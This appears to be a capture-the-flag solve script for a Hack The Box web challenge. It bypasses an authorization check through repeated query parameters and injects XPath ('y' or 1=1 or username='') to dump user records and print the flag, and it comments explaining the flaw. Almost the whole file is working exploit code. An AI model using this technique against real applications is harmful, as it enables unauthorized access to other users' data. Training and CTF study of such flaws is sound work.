#!/usr/bin/env python3
"""TreaPortal (HTB) - array query parameter bypasses the XPath guard.

The /api/user route only enforces `username === token.username` when the
query value is a string. Repeating the parameter makes Fastify hand the
handler an array, which skips the check. The XPath blacklist then runs
Array.prototype.includes, which compares whole elements instead of
substrings, so an injection hidden inside a longer element passes. The
joined array is interpolated into `//user[username='...']`.

Usage:
    python3 solve.py <target_ip> <target_port>
"""
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

INJECTION = "y' or 1=1 or username='"


def request(url, data=None, token=None):
    headers = {}
    if data is not None:
        data = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, data=data, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        return 2
    base = f"http://{sys.argv[1]}:{sys.argv[2]}"

    name = f"u{int(time.time())}{sys.argv[2]}"
    status, body = request(
        base + "/api/auth/register",
        {"username": name, "email": name + "@trea.htb", "password": "Passw0rd!"},
    )
    if status != 200:
        print(f"[-] register failed: {status} {body[:200]!r}", file=sys.stderr)
        return 1
    token = json.loads(body)["jwt"]

    # Two values -> array -> the typeof check is skipped and the join
    # produces `x,y' or 1=1 or username='`, i.e.
    # //user[username='x,y' or 1=1 or username='']
    query = urllib.parse.urlencode(
        [("username", "x"), ("username", INJECTION)]
    )
    status, body = request(base + "/api/user/?" + query, token=token)
    if status != 200:
        print(f"[-] injection failed: {status} {body[:200]!r}", file=sys.stderr)
        return 1

    user = json.loads(body)
    if not user.get("flag"):
        print(f"[-] no flag in response: {user}", file=sys.stderr)
        return 1
    print(user["flag"])
    return 0


if __name__ == "__main__":
    sys.exit(main())
